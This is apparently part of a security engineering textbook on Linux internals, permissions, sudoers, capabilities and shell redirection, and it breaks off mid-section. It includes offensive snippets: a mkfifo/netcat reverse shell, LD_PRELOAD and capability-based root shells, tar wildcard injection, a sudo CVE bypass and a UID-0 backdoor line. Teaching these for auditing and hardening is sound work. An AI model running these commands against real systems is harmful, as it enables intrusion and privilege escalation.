# PART II: LINUX INTERNALS, SYSTEM ADMINISTRATION & BASH SCRIPTING MASTERY

---

# Chapter 6: Linux Internals & Architecture for Security Engineers

## 6.1 Kernel Space vs. User Space & Hardware Privilege Rings

To audit, harden, or exploit a Linux system, you must first understand how the operating system enforces isolation between untrusted user applications and the underlying hardware. On x86-64 processors, the CPU hardware implements four privilege levels known as **Protection Rings** (Ring 0 through Ring 3); modern Linux utilizes two of them:

- **Ring 3 (User Space)**: Unprivileged execution mode where all user applications, web servers (`nginx`), databases (`postgres`), and shells (`bash`) execute. Code in Ring 3 cannot directly access physical memory addresses, I/O ports, network cards, or disk controllers, nor can it execute privileged CPU instructions (such as `hlt`, `lgdt`, or modifying control registers like `CR3`). Each user process operates inside an isolated **Virtual Address Space** managed by the CPU's Memory Management Unit (MMU) and page tables.
- **Ring 0 (Kernel Space)**: Privileged execution mode where the Linux kernel (`vmlinuz`) and loadable kernel modules (`.ko` files) execute. The kernel has unrestricted access to all physical RAM, CPU registers, and hardware devices.

```
+-------------------------------------------------------------------------+
|                        USER SPACE (CPU RING 3)                          |
|                                                                         |
|  +---------------+     +---------------+     +-----------------------+  |
|  |  /bin/bash    |     | /usr/sbin/sshd|     |  Python Web Backend   |  |
|  +-------+-------+     +-------+-------+     +-----------+-----------+  |
|          |                     |                         |              |
|          +---------------------+-------------------------+              |
|                                |                                        |
|                                v                                        |
|            C Standard Library (glibc / musl: open, read, fork)          |
+--------------------------------+----------------------------------------+
                                 |
       ============= SYSTEM CALL INTERFACE (syscall / int 0x80) =============
                                 | (Context Switch: Ring 3 -> Ring 0)
+--------------------------------v----------------------------------------+
|                       KERNEL SPACE (CPU RING 0)                         |
|                                                                         |
|  +-------------------------------------------------------------------+  |
|  |         System Call Dispatcher (sys_read, sys_execve, ...)        |  |
|  +-----------------+-----------------------+-------------------------+  |
|                    |                       |                            |
|                    v                       v                            |
|  +------------------------+  +--------------------------+  +---------+  |
|  | Virtual File System    |  | Network Stack (Netfilter,|  | Process |  |
|  | (VFS, ext4, XFS, proc) |  | sk_buff, TCP/IP, eBPF)   |  | Sched.  |  |
|  +------------------------+  +--------------------------+  +---------+  |
|                                    |                                    |
|                                    v                                    |
|                 Device Drivers & Hardware Abstraction                   |
+------------------------------------+------------------------------------+
                                     |
                      +--------------v--------------+
                      |  PHYSICAL HARDWARE (CPU,    |
                      |  RAM, NVMe, NIC Silicon)    |
                      +-----------------------------+
```

### 6.1.1 System Calls (`syscalls`) and the Context Switch Mechanism
Because a Ring 3 process cannot read a file from disk or open a network socket directly, it must ask the kernel to perform the operation on its behalf via a **System Call (`syscall`)**.
On 64-bit Linux (`x86_64` ABI):
1. The user process loads the **System Call Number** into the `RAX` register (e.g., `RAX = 0` for `sys_read`, `RAX = 1` for `sys_write`, `RAX = 2` for `sys_open`, `RAX = 59` for `sys_execve`).
2. Up to six arguments are placed in registers `RDI`, `RSI`, `RDX`, `R10`, `R8`, and `R9`.
3. The process executes the `syscall` assembly instruction, triggering a hardware trap that transitions the CPU from Ring 3 to Ring 0 and jumps to the kernel's system call handler (`entry_SYSCALL_64`).
4. The kernel validates the pointers, checks security permissions (UID/GID, Capabilities, SELinux/AppArmor LSM hooks, and `seccomp-bpf` filters), performs the operation, places the return value (or negative `-errno` code) into `RAX`, and executes `sysret` to return to Ring 3.

### 6.1.2 Dynamic Binary Inspection with `strace` and `ltrace`
During penetration tests, malware triage, and privilege escalation audits, you frequently encounter stripped binaries where source code is unavailable.
- **`strace` (System Call Tracer)**: Uses the `ptrace` system call to intercept and record every **System Call** (`openat`, `read`, `write`, `execve`, `connect`, `stat`) and **Signal** crossing the User-Space/Kernel-Space boundary.
- **`ltrace` (Library Call Tracer)**: Intercepts dynamic library calls made to shared libraries (`libc.so.6`, `libssl.so`) such as `strcmp()`, `getenv()`, `malloc()`, `strcpy()`, and `system()`.

#### Real-World Security Engineering Example: Auditing an Unknown SUID Binary
Suppose you find a custom SUID-root binary `/usr/local/bin/backup-helper` on a server. Before running it blindly, inspect its runtime behavior safely as an unprivileged user:

```bash
# 1. Trace library calls to see if it checks environment variables or compares hardcoded passwords
ltrace -s 128 /usr/local/bin/backup-helper

# Sample ltrace output:
# getenv("BACKUP_CONFIG_DIR")                      = nil
# strcmp("guest_token", "Sup3rS3cr3tAdm1nT0k3n!")   = -1
# puts("Access Denied: Invalid token.")            = 30

# 2. Trace system calls (-f follows child processes, -e trace=... filters specific syscalls, -s 256 prevents string truncation)
strace -f -s 256 -e trace=openat,execve,stat,access /usr/local/bin/backup-helper

# Sample strace output revealing two critical privilege escalation flaws:
# access("/etc/backup-custom/pre-hook.sh", X_OK)   = -1 ENOENT (No such file or directory)
# [pid 14921] execve("/home/student/bin/tar", ["tar", "-czf", "/tmp/bak.tgz", "/var/www"], ...) = -1 ENOENT
# [pid 14921] execve("/usr/local/bin/tar", ["tar", "-czf", "/tmp/bak.tgz", "/var/www"], ...) = -1 ENOENT
# [pid 14921] execve("/usr/bin/tar", ["tar", "-czf", "/tmp/bak.tgz", "/var/www"], ...) = 0
```

Look at what `strace` and `ltrace` revealed in 5 seconds:
1. `ltrace` exposed a hardcoded secret comparison inside `strcmp()`!
2. `strace` revealed that the binary attempts to execute `/etc/backup-custom/pre-hook.sh` and invokes `tar` using a **relative path** (`system("tar -czf ...")`), searching the user's `$PATH` (`/home/student/bin/tar`) before `/usr/bin/tar`!

---

## 6.2 The Linux Boot Sequence: From Silicon Power-On to `PID 1`

Understanding the Linux boot chain is essential for configuring hardware-backed encryption (TPM2 + LUKS2), Secure Boot, kernel command-line hardening, and diagnosing rootkits or physical-access attacks.

```
[1. BIOS / UEFI Firmware] ---> [2. Bootloader (GRUB2)] ---> [3. Kernel (vmlinuz) + initramfs]
                                                                          |
     [5. Multi-User Targets & Login (sshd / getty)] <--- [4. Init System (systemd PID 1)]
```

1. **Stage 1: UEFI Firmware & Secure Boot (POST)**:
   - When power is applied, the CPU executes firmware stored in motherboard SPI flash memory.
   - Modern **UEFI (Unified Extensible Firmware Interface)** initializes hardware and reads the **EFI System Partition (ESP)** (typically mounted at `/boot/efi`), looking for signed `.efi` binaries (such as `shimx64.efi` and `grubx64.efi`).
   - If **UEFI Secure Boot** is enabled, the firmware cryptographically verifies the digital signature of the bootloader against public keys stored in NVRAM (`PK` Platform Key, `KEK` Key Exchange Key, and `db` Signature Database), preventing bootkits from executing unsigned code before the OS loads.
2. **Stage 2: Bootloader (`GRUB2`)**:
   - Reads `/boot/grub/grub.cfg` to present the kernel selection menu and passes kernel command-line parameters (e.g., `ro quiet splash apparmor=1 security=apparmor iommu=force`).
   - *Physical Security Vulnerability*: If an attacker has physical console access and the GRUB menu is **not** password-protected (`grub-mkpasswd-pbkdf2`), the attacker can press `e` at boot, append `init=/bin/bash` or `rd.break` to the `linux` kernel line, and boot directly into an unauthenticated `root` shell!
3. **Stage 3: Linux Kernel (`vmlinuz`) & Initial RAM Disk (`initramfs` / `initrd.img`)**:
   - GRUB loads the compressed Linux kernel image (`/boot/vmlinuz-<version>`) into RAM alongside the **Initial RAM Filesystem (`initramfs`)**.
   - Why is `initramfs` necessary? If the root filesystem (`/`) is stored on an encrypted LUKS2 volume, an LVM logical volume, or a software RAID array, the kernel needs storage and cryptographic drivers *before* it can mount `/`. The kernel mounts `initramfs` in RAM as a temporary root filesystem, loads the required kernel modules, prompts for the LUKS passphrase (or unseals it from the TPM2 chip), mounts the real root filesystem on disk, and calls `pivot_root` / `switch_root`.
4. **Stage 4: `systemd` Initialization (`PID 1`)**:
   - The kernel executes `/sbin/init` (symlinked to `/lib/systemd/systemd`) as Process ID 1 (`PID 1`).
   - `systemd` mounts filesystems defined in `/etc/fstab`, applies kernel parameters from `/etc/sysctl.d/`, brings up network interfaces, and activates service units up to the default target (`multi-user.target` or `graphical.target`).

---

## 6.3 Filesystem Hierarchy Standard (FHS) from a Security Lens

In Linux, **"everything is a file"**—regular files, directories, block devices, character devices, network sockets, named pipes, and kernel telemetry structures are all exposed under a unified Virtual File System (VFS) tree rooted at `/`.

| Directory | FHS Purpose | Offensive & Defensive Security Significance |
| :--- | :--- | :--- |
| **`/etc`** | Host-specific system-wide configuration files. | Contains `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, `/etc/crontab`, `/etc/ssh/sshd_config`, `/etc/systemd/system/`. Primary target for File Integrity Monitoring (FIM) and privilege escalation audits. |
| **`/proc`** | Virtual pseudo-filesystem (`procfs`) mounted in RAM exposing live kernel and process structures. | Inspect `/proc/version` (kernel version), `/proc/cmdline` (boot flags), `/proc/net/tcp` (active sockets even if `netstat`/`ss` are missing!), and `/proc/<PID>/` (per-process cmdline, environment variables, open file descriptors, and memory maps). |
| **`/sys`** | Virtual filesystem (`sysfs`) exposing kernel objects, hardware devices, and security modules. | `/sys/kernel/security/` exposes AppArmor/SELinux/LSM state; `/sys/devices/system/cpu/vulnerabilities/` reports hardware mitigations for Spectre, Meltdown, Retbleed, and Downfall. |
| **`/var`** | Variable data modified during normal system operation. | `/var/log/` (system/auth/web logs), `/var/www/` (web root), `/var/spool/cron/crontabs/` (per-user cron jobs), `/var/lib/docker/` (Docker container layers and volumes—reading this as root or via `docker` group membership compromises all containers). |
| **`/tmp`** & **`/var/tmp`** | World-writable (`1777`) temporary storage directories. | Attackers and low-privilege shells (`www-data`) use `/tmp` and `/var/tmp` to stage enumeration scripts (`linpeas.sh`), compile local exploits, or drop reverse shells. **Hardening**: Mount `/tmp` as a separate partition with `noexec,nosuid,nodev`. |
| **`/dev/shm`** | Shared memory `tmpfs` filesystem backed entirely by **volatile RAM**. | Because `/dev/shm` resides in RAM rather than on physical disk blocks, threat actors and red teamers stage payloads here to avoid leaving disk forensic artifacts. Must also be mounted with `noexec,nosuid,nodev`. |
| **`/opt`** | Add-on third-party commercial or custom enterprise software packages. | Frequently contains custom enterprise agents, monitoring scripts, or third-party daemons with misconfigured file permissions or hardcoded credentials. |
| **`/usr`** | Read-only user utilities, binaries (`/usr/bin`, `/usr/sbin`), and libraries (`/usr/lib`). | Contains system binaries and SUID utilities; `/usr/local/bin` holds administrator-installed scripts that often appear early in `$PATH`. |

---

## 6.4 Deep Dive: Identity & Authentication Files (`/etc/passwd`, `/etc/shadow`, `/etc/group`, `/etc/sudoers`)

### 6.4.1 `/etc/passwd` (World-Readable User Account Database: `-rw-r--r--`)
Every process and file on Linux is owned by a numeric **User ID (`UID`)** and **Group ID (`GID`)**. The kernel cares only about numeric IDs; `/etc/passwd` maps human-readable usernames to numeric UIDs. Because tools like `ls -l` and `ps` must translate UIDs to names, `/etc/passwd` is readable by all users (`0644`).

Each line contains **7 colon-delimited fields**:
```text
sithum:x:1000:1000:Sithum Security Engineer,,,:/home/sithum:/bin/bash
```
1. **Username** (`sithum`): Account login name.
2. **Password Placeholder** (`x`): Historically stored a `crypt(3)` password hash! Today, `x` indicates the actual password hash is protected inside `/etc/shadow`.
   - *Critical Security Risk*: If `/etc/passwd` is accidentally made writable (or if an attacker can append a line via an arbitrary file-write bug), the attacker can generate a password hash with `openssl passwd -6 "P@ssw0rd123"` and insert a line with `UID 0`:
     `backdoor:$6$salt$hash...:0:0:root:/root:/bin/bash`
     Because the Linux kernel treats **any account with `UID 0` as `root`**, running `su backdoor` grants an instant root shell!
3. **UID (`1000`)**:
   - `0`: Superuser (`root`).
   - `1–999`: System and service accounts (`daemon`, `www-data`, `sshd`, `postgres`).
   - `1000+`: Regular human user accounts (defined by `UID_MIN` in `/etc/login.defs`).
4. **Primary GID (`1000`)**: Default group ID assigned to files created by this user.
5. **GECOS (`Sithum Security Engineer,,,`)**: Comment/contact metadata field.
6. **Home Directory (`/home/sithum`)**: Starting directory upon login.
7. **Login Shell (`/bin/bash`)**: Program executed upon interactive login. Service accounts that should never log in interactively are assigned `/usr/sbin/nologin` or `/bin/false`.

### 6.4.2 `/etc/shadow` (Protected Password Hash Database: `-rw-r----- root:shadow`)
Readable only by `root` and members of the `shadow` group (`0640` or `0600`), `/etc/shadow` stores salted password hashes and password aging policies across **9 colon-delimited fields**:

```text
sithum:$y$j9T$X8kLm92pQrStUvWx$4bN7mK2vL9pQ1zR8wE5tY6uI3oP0aS2dF4gH6jK8lM0:19850:0:99999:7:::
```

1. **Username**: Matches `/etc/passwd`.
2. **Salted Password Hash**: Formatted as `$id$parameters$salt$hash` (or `!` / `*` if password login is locked).
3. **Last Password Change (`19850`)**: Days since the Unix Epoch (January 1, 1970).
4. **Minimum Password Age (`0`)**: Minimum days required between password changes.
5. **Maximum Password Age (`99999`)**: Days before password expires.
6. **Warning Period (`7`)**: Days before expiration that the user is warned.
7. **Inactivity Period**: Days after password expiration before account is disabled.
8. **Account Expiration Date**: Absolute date (days since Jan 1, 1970) when account is disabled.
9. **Reserved Field**.

#### Cryptographic Anatomy of Linux Shadow Hash Identifiers (`$id$`)
When auditing `/etc/shadow` or cracking weak passwords with **Hashcat** or **John the Ripper**, identify the algorithm from the prefix:

| Prefix (`$id$`) | Algorithm | Cryptographic Strength & Security Assessment | Hashcat Mode (`-m`) |
| :--- | :--- | :--- | :--- |
| **`$1$`** | MD5crypt | **Critically Weak / Obsolete**: Fast GPU cracking (billions of hashes/sec). | `-m 500` |
| **`$2a$` / `$2b$` / `$2y$`** | Blowfish (`bcrypt`) | **Strong**: Configurable work factor (cost `2^N`), resistant to GPU acceleration. | `-m 3200` |
| **`$5$`** | SHA-256crypt | **Moderate (Legacy)**: Uses 5,000 rounds of SHA-256 by default; vulnerable to modern GPU clusters if passwords lack entropy. | `-m 7400` |
| **`$6$`** | SHA-512crypt | **Standard (Legacy Default)**: Uses 5,000 rounds of SHA-512 by default (configurable via `rounds=N$`). CPU-hard, but lacks memory-hardness against GPUs/FPGAs. | `-m 1800` |
| **`$y$`** | **yescrypt** | **Modern Elite Default (Debian 11+, Ubuntu 22.04+, Kali, Fedora)**: Memory-hard, time-hard KDF built on `scrypt` / `PBKDF2-SHA256`. Specifically engineered to defeat massive GPU, ASIC, and FPGA cracking rigs by requiring large per-thread SRAM/VRAM allocations. | John the Ripper (`--format=crypt` or native yescrypt) |

### 6.4.3 `/etc/group` and Privileged System Groups
`/etc/group` defines supplementary group memberships (`group_name:password_placeholder:GID:user_list`). During a security audit, always run `id` and inspect whether a user belongs to any **root-equivalent groups**:
- **`sudo` / `wheel` (`GID 27`)**: Grants administrative execution via `sudo`.
- **`docker` / `lxd` / `libvirt`**: Any user in the `docker` group can mount the host's root filesystem inside an interactive container (`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`), granting immediate unauthenticated `root` access to the host!
- **`shadow` (`GID 42`)**: Allows reading `/etc/shadow`.
- **`adm` (`GID 4`)**: Allows reading `/var/log/` files (including `/var/log/auth.log` and web logs, which may leak accidentally typed passwords or session tokens).
- **`disk` (`GID 6`)**: Grants raw read/write access to block devices (`/dev/sda`, `/dev/nvme0n1`), allowing raw extraction of `/etc/shadow` and `/root/.ssh/id_ed25519` via `debugfs`.

### 6.4.4 `/etc/sudoers` Architecture & Fatal Misconfigurations
Managed exclusively via the syntax-validating editor **`visudo`**, `/etc/sudoers` (and drop-in files in `/etc/sudoers.d/`) controls delegated privilege elevation.

```text
# User-Specification   Host=(RunAs-User:RunAs-Group)   [Tags]        Command-List
appadmin               ALL=(root:root)                 NOPASSWD:     /usr/bin/systemctl restart nginx
```

#### Classic `/etc/sudoers` Vulnerabilities to Audit (`sudo -l`)
1. **GTFOBins Escape Vectors**: Granting `sudo` on interactive binaries like `vim`, `less`, `more`, `man`, `find`, `awk`, `python3`, `perl`, `tar`, `zip`, or `journalctl` allows the user to spawn an interactive `root` shell (`!/bin/sh` in `vim`/`less`/`journalctl`, or `find . -exec /bin/sh \; -quit`).
2. **`LD_PRELOAD` / `LD_LIBRARY_PATH` Preservation**: If `/etc/sudoers` contains `Defaults env_keep += "LD_PRELOAD"`, an attacker can compile a 10-line shared C library with an `_init()` constructor that calls `setuid(0); setgid(0); system("/bin/bash");` and run `sudo LD_PRELOAD=/tmp/evil.so <any_allowed_command>`.
3. **Wildcard Injection**: A rule allowing `/usr/bin/chown -R www-data:www-data /var/www/html/*` or `/bin/tar czf /backup.tgz *` allows an attacker to create files named `--reference=/etc/passwd` or `--checkpoint=1` + `--checkpoint-action=exec=sh shell.sh`, tricking GNU `Getopt` into parsing filenames as command-line flags!
4. **CVE-2019-14287 (`ALL, !root`)**: In older `sudo` versions (< 1.8.28), a rule written as `(ALL, !root) /bin/bash` intended to allow running `/bin/bash` as any user *except* `root` could be bypassed by running `sudo -u#-1 /bin/bash` or `sudo -u#4294967295 /bin/bash`, because `setresuid(-1)` converts into UID `0` inside the kernel!

---

## 6.5 File Permissions, `umask`, Special Bits, ACLs, Attributes & Linux Capabilities

### 6.5.1 Standard POSIX Permissions & Octal Math
Every inode stores three permission triads for **User/Owner (`u`)**, **Group (`g`)**, and **Others (`o`)**:
- **Read (`r` = `4`)**:
  - On a *file*: Read the file's data bytes.
  - On a *directory*: List the filenames inside the directory (`readdir`).
- **Write (`w` = `2`)**:
  - On a *file*: Modify or truncate the file's contents.
  - On a *directory*: Create, rename, or **delete** files inside that directory! *(Crucial Security Concept: If a user has write (`w`) and execute (`x`) permission on a directory without the Sticky Bit, they can delete or replace a file owned by `root` (`0400`) inside that directory!)*
- **Execute (`x` = `1`)**:
  - On a *file*: Execute the file as a process (`execve`).
  - On a *directory*: Traverse/enter (`cd`) the directory and access inodes inside it if you know their exact filename.

### 6.5.2 Understanding `umask` (User File-Creation Mode Mask)
When a process creates a new file (`open(..., O_CREAT, 0666)`) or directory (`mkdir(..., 0777)`), the kernel subtracts (via bitwise `mode & ~umask`) the process's `umask` to determine the default permissions:
- **Base Modes**: `0666` for regular files (files are never executable by default), `0777` for directories.
- **Standard `umask 0022`**:
  - New File: $0666 - 0022 = \mathbf{0644}$ (`-rw-r--r--`)
  - New Directory: $0777 - 0022 = \mathbf{0755}$ (`drwxr-xr-x`)
- **Hardened CIS Benchmark `umask 0027`** (Recommended for servers):
  - New File: $0666 - 0027 = \mathbf{0640}$ (`-rw-r-----`)
  - New Directory: $0777 - 0027 = \mathbf{0750}$ (`drwxr-x---`) — *Prevents unauthorized "Other" users from reading newly created logs or configs!*

### 6.5.3 Special Permission Bits: SUID (`4000`), SGID (`2000`), and Sticky Bit (`1000`)

| Special Bit | Octal Value | Symbolic (`ls -l`) | Behavior on Executables | Behavior on Directories |
| :--- | :--- | :--- | :--- | :--- |
| **SUID (Set User ID)** | **`4000`** (`u+s`) | `-rwsr-xr-x` (`S` if no `x`) | Process executes with the **Effective UID (`EUID`) of the file's owner** (e.g., `/usr/bin/passwd` runs as `root` so users can update `/etc/shadow`). | Ignored on Linux. |
| **SGID (Set Group ID)** | **`2000`** (`g+s`) | `-rwxr-sr-x` (`S` if no `x`) | Process executes with the **Effective GID (`EGID`) of the file's group**. | Newly created files/subdirectories inside the directory automatically inherit the directory's group ownership rather than the creator's primary group. |
| **Sticky Bit** | **`1000`** (`+t`) | `drwxrwxrwt` (`T` if no `x`) | Historically kept text segment in swap; ignored on modern Linux executables. | **Restricted Deletion Flag**: On world-writable directories like `/tmp` (`1777`), only the file's owner, the directory's owner, or `root` can delete or rename a file inside the directory. |

### 6.5.4 Extended Access Control Lists (`getfacl` & `setfacl`)
Standard POSIX permissions only allow assigning one owner and one group per file. **POSIX Extended ACLs** allow granular per-user and per-group permissions.
> [!IMPORTANT]
> **Always Check for the Trailing `+` in `ls -l`!**
> When `ls -la` displays `-rw-r-----+\ 1 root shadow 1420 Nov 02 10:00 /etc/shadow`, that tiny **`+`** sign after the permission bits means an **Extended ACL** is attached! Even if standard permissions appear secure, an ACL may grant read/write access to a low-privilege user.

```bash
# 1. Inspect extended ACLs on a file or recursively scan a directory for hidden ACLs (-s skips files with only base permissions)
getfacl /etc/shadow
getfacl -R -s /etc /var/www 2>/dev/null

# 2. Grant user 'auditor' read-only access to /var/log/nginx/access.log without changing group ownership
sudo setfacl -m u:auditor:r-- /var/log/nginx/access.log

# 3. Remove a specific ACL entry (-x) or strip all extended ACLs (-b)
sudo setfacl -x u:auditor /var/log/nginx/access.log
sudo setfacl -b /var/log/nginx/access.log
```

### 6.5.5 Extended Filesystem Attributes (`lsattr` & `chattr`)
On `ext4` and `XFS` filesystems, kernel-enforced inode attributes (`chattr`) override even `root` (`UID 0`) until the attribute is explicitly removed:
- **`+i` (Immutable)**: The file **cannot be modified, deleted, renamed, or hard-linked**—not even by `root`!
  - *Defensive Use*: Protecting critical static configs (`/etc/resolv.conf`, `/etc/passwd`) against accidental overwriting.
  - *Offensive / Incident Response Trap*: Rootkits and king-of-the-hill (KotH) attackers frequently set `chattr +i` on their backdoor cron jobs or `/root/.ssh/authorized_keys` so that when a blue teamer tries `sudo rm /etc/cron.d/backdoor`, they receive `Operation not permitted` even as `root`!
- **`+a` (Append-Only)**: The file can only be opened in append mode (`>>`) for writing; existing lines cannot be truncated or overwritten (ideal for log files `/var/log/auth.log`).

```bash
# Inspect extended attributes in /etc/cron.d
lsattr /etc/cron.d/

# Output showing an immutable file ('i' flag in column 5):
# ----i---------e------- /etc/cron.d/persistence_job

# Remove the immutable attribute as root (requires CAP_LINUX_IMMUTABLE capability) and delete the file
sudo chattr -i /etc/cron.d/persistence_job
sudo rm -f /etc/cron.d/persistence_job
```

### 6.5.6 Linux Capabilities (`getcap` & `setcap`)
Historically, UNIX divided processes into two buckets: privileged (`EUID 0`, bypassing all kernel permission checks) and unprivileged (`EUID != 0`). If a binary like `ping` needed to open a raw ICMP socket, or `tcpdump` needed to capture packets, the entire binary had to be made SUID-root (`4755`)—meaning any bug in `tcpdump` yielded full `root` compromise.

**Linux Capabilities (`man 7 capabilities`)** partition `root`'s monolithic power into ~41 distinct privilege units that can be attached selectively to binaries or processes:

| Capability Name | Permitted Kernel Privilege | Privilege Escalation / Security Impact if Misconfigured |
| :--- | :--- | :--- |
| **`CAP_SETUID`** | Make arbitrary manipulations of process UIDs (`setuid(0)`). | **Instant Root**: If attached to `python3`, `perl`, `node`, or `php` (`cap_setuid+ep`), running `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` spawns a `root` shell! |
| **`CAP_SETGID`** | Make arbitrary manipulations of process GIDs (`setgid(0)`). | Escalation to `GID 0` (`root` group) or `shadow`/`docker` group. |
| **`CAP_DAC_READ_SEARCH`** | Bypass all file read permission checks and directory `r`/`x` checks. | Allows reading `/etc/shadow`, `/root/.ssh/id_ed25519`, or any file on the system (e.g., if set on `tar`, `openssl`, or `vim`). |
| **`CAP_DAC_OVERRIDE`** | Bypass all file read, write, and execute permission checks. | **Instant Root**: Allows overwriting `/etc/passwd`, `/etc/sudoers`, or `/etc/shadow`. |
| **`CAP_NET_RAW`** | Use `RAW` and `PACKET` sockets (used legitimately by `/usr/bin/ping` and `tcpdump`). | Allows an unprivileged user to sniff raw network traffic or forge arbitrary ARP/ICMP/TCP packets on the local interface. |
| **`CAP_NET_BIND_SERVICE`** | Bind a socket to privileged TCP/UDP ports below `1024` (e.g., allowing non-root `nginx` or `node` to listen on port `80`/`443`). | Safe when applied solely as `cap_net_bind_service+ep` on a hardened web daemon; enables running web servers without `root`! |
| **`CAP_SYS_ADMIN`** | The "new root": allows `mount()`, `umount()`, namespace manipulation, `bpf()`, `quotactl()`. | Equivalent to full `root` via filesystem mounting or container escape. |
| **`CAP_SYS_PTRACE`** | Trace arbitrary processes using `ptrace(2)`. | Allows injecting shellcode into running `root` processes on the same host. |

```bash
# Recursively enumerate all binaries with assigned Linux Capabilities across the entire filesystem
getcap -r / 2>/dev/null

# Sample output on a vulnerable host:
# /usr/bin/ping cap_net_raw=ep
# /usr/bin/python3.12 cap_setuid=ep

# Defensive Remediation: Strip dangerous capability from python3.12
sudo setcap -r /usr/bin/python3.12
```

---

## 6.6 Chapter 6 Hands-On Lab Exercises & Review Questions

### Lab 6.1: Privilege Escalation Surface Audit (SUID, Capabilities, ACLs & Immutable Files)
Run the following commands on your Linux lab VM to build a complete baseline of special permissions:
```bash
# 1. Find all SUID (4000) and SGID (2000) binaries across the filesystem
find / -perm /6000 -type f -exec ls -ld {} + 2>/dev/null

# 2. Enumerate all file capabilities
getcap -r / 2>/dev/null

# 3. Create a test binary copy of python3 in /tmp, assign cap_setuid+ep, verify escalation, and clean up
cp /usr/bin/python3 /tmp/py_cap_test
sudo setcap cap_setuid+ep /tmp/py_cap_test
getcap /tmp/py_cap_test
/tmp/py_cap_test -c 'import os; os.setuid(0); os.system("id")'
rm -f /tmp/py_cap_test
```

### Chapter 6 Review Questions
1. Explain the hardware and kernel steps that occur when a user-space process in Ring 3 invokes the `read()` function in `glibc` to read data from a file.
2. Why does `strace` reveal file access attempts (`openat`, `access`) whereas `ltrace` is better suited for spotting cleartext string comparisons (`strcmp`) in dynamically linked binaries?
3. What is the difference between a `$6$` hash and a `$y$` hash in `/etc/shadow`, and why is `$y$` (yescrypt) significantly more resistant to GPU-based offline password cracking?
4. Why does a user who has write (`w`) and execute (`x`) permissions on a directory—without the Sticky Bit set—have the ability to delete a file owned by `root` (`0400`) inside that directory?
5. Why is assigning `cap_net_bind_service=ep` to a custom Node.js binary vastly superior to making the binary `SUID root` (`chmod u+s`) when it only needs to bind to TCP port `443`?

---

# Chapter 7: Command-Line Mastery, Text Processing & Log Analysis

## 7.1 Standard Streams, File Descriptors, Redirection, and Named Pipes (`mkfifo`)

Every process in Linux starts with three open **File Descriptors (`FD`)** maintained in the process's kernel file descriptor table (`/proc/<PID>/fd/`):
- **`FD 0` (`stdin` — Standard Input)**: Default input stream (keyboard/terminal or upstream pipe).
- **`FD 1` (`stdout` — Standard Output)**: Default buffered output stream for normal program results.
- **`FD 2` (`stderr` — Standard Error)**: Default unbuffered output stream for error and diagnostic messages.

### 7.1.1 Precision Redirection Idioms (Why Order Matters!)
Understanding how the shell duplicates file descriptors (`dup2()` syscall) explains why `> file 2>&1` works while `2>&1 > file` fails to capture `stderr` into the file:

```bash
# 1. Redirect stdout to a file (truncating it) and discard stderr to the null device (/dev/null)
find / -name "*.conf" > /tmp/configs.txt 2>/dev/null

# 2. Redirect BOTH stdout (FD 1) and stderr (FD 2) into the same log file (POSIX standard)
# Step A: '> audit.log' points FD 1 to 'audit.log'
# Step B: '2>&1' copies FD 1's current target ('audit.log') into FD 2
nmap -sV -sC 192.168.56.101 > audit.log 2>&1

# Modern Bash shorthand equivalent for '> audit.log 2>&1':
nmap -sV -sC 192.168.56.101 &> audit.log

# 3. Pipe both stdout and stderr to 'tee' so you see live output on screen AND save it to a file
nmap -p- -T4 192.168.56.101 2>&1 | tee full_port_scan.log
```

### 7.1.2 Anonymous Pipes (`|`) vs. Named Pipes (`FIFO` / `mkfifo`)
- **Anonymous Pipe (`cmd1 | cmd2`)**: Creates an ephemeral kernel ring buffer in RAM connecting `FD 1` of `cmd1` to `FD 0` of `cmd2`. It exists only for the lifetime of the pipeline and has no filename on disk.
- **Named Pipe (`mkfifo`)**: Creates a special `FIFO` (First-In, First-Out) inode on the filesystem (`p` in `ls -l`). Any two independent processes can read from and write to the named pipe simultaneously while all data flows strictly through kernel memory without writing payload contents to disk blocks.

#### Security Engineering Use Case: How Named Pipes Enable Interactive Reverse Shells & Bidirectional Relays
Suppose a minimal Linux container has OpenBSD `netcat` (`nc`) compiled *without* the `-e` (`--exec`) flag. How do you connect `/bin/sh`'s input and output bidirectionally across a network socket? Using a Named Pipe (`mkfifo`):

```bash
# Create a named pipe at /tmp/f, pipe its contents into /bin/sh, send stdout & stderr into nc,
# and redirect nc's received network output back into the named pipe /tmp/f:
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.56.10 4444 > /tmp/f
rm -f /tmp/f
```

```
                 +------------------+
                 |  Named Pipe FIFO |
       +-------->|      /tmp/f      |--------+
       |         +------------------+        | (cat /tmp/f)
       |                                     v
+------+-------+                      +------+-------+
| nc 192...4444|<---------------------| /bin/sh -i   |
+--------------+  (stdout + stderr)   +--------------+
```

Defensive Use Case for Named Pipes: Streaming uncompressed database backups or raw packet captures directly into an `openssl` encryption stream or remote SSH collector without ever touching local disk storage!

---

## 7.2 Binary, File, and Cryptographic Inspection Utilities

When auditing a system, analyzing suspicious files in `/tmp`, or inspecting network payloads, master these eight core utilities:

### 7.2.1 `find` — Surgical Filesystem Auditing
Never guess where files are hidden; query inode metadata directly with `find`:

```bash
# 1. Find all world-writable files (excluding /proc and /sys) that could be modified for privilege escalation
find / -path /proc -prune -o -path /sys -prune -o -type f -perm -0002 -exec ls -la {} + 2>/dev/null

# 2. Find files modified within the last 15 minutes (-mmin -15) during an Incident Response triage
find /etc /var /tmp /home -type f -mmin -15 -printf "%TY-%Tm-%Td %TH:%TM:%TS %u:%g %m %p\n" 2>/dev/null | sort -r

# 3. Find configuration files owned by user 'www-data' or containing 'config' in their name
find /var/www -user www-data \( -name "*.php" -o -name "*.env" -o -name "*.json" \) 2>/dev/null

# 4. Find unowned ("orphaned") files whose UID or GID no longer exists in /etc/passwd or /etc/group
find / -nouser -o -nogroup 2>/dev/null
```

### 7.2.2 `file`, `strings`, `xxd`, and `hexdump` — Dissecting Unknown Artifacts
Attackers routinely disguise ELF binaries or PHP web shells by naming them `logo.png` or `.session_cache`. Never trust a file extension—inspect the **Magic Bytes** (file header signature) at offset `0x00`:

```bash
# 1. Inspect true file type via magic bytes (libmagic)
file /var/www/html/uploads/avatar.png
# Output if backdoored: /var/www/html/uploads/avatar.png: PHP script, ASCII text
# Output for Linux binary: ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped

# 2. Extract printable ASCII & UTF-16LE strings (min length 6) with hexadecimal file offsets (-t x)
